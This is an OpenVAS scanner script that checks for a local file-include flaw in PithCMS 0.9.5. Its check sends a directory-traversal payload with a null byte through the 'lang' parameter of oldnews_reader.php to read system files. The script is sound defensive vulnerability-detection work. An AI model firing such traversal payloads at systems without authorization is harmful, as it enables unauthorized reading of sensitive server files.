###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_PithCMS_40926.nasl 14323 2019-03-19 13:19:09Z jschulte $
#
# PithCMS 'lang' Parameter Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100689");
  script_version("$Revision: 14323 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:19:09 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-06-22 12:10:21 +0200 (Tue, 22 Jun 2010)");
  script_bugtraq_id(40926);
  script_tag(name:"cvss_base", value:"2.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");

  script_name("PithCMS 'lang' Parameter Local File Include Vulnerability");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/40926");
  script_xref(name:"URL", value:"http://pithcms.altervista.org/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"An Update is available. See References.");
  script_tag(name:"summary", value:"PithCMS is prone to a local file-include vulnerability because it
  fails to properly sanitize user-supplied input.

  An attacker can exploit this vulnerability to obtain potentially
  sensitive information and execute arbitrary local scripts in the
  context of the webserver process. This may allow the attacker to
  compromise the application and the underlying computer, other attacks
  are also possible.

  PithCMS 0.9.5 is vulnerable, other versions may also be affected.");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/cms", "/PithCMS", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file (keys(files)) {

    url = string(dir, "/oldnews_reader.php?lang=../../../../../../../../../../../../../../../",files[file],"%00 ");

    if(http_vuln_check(port:port, url:url,pattern:file)) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
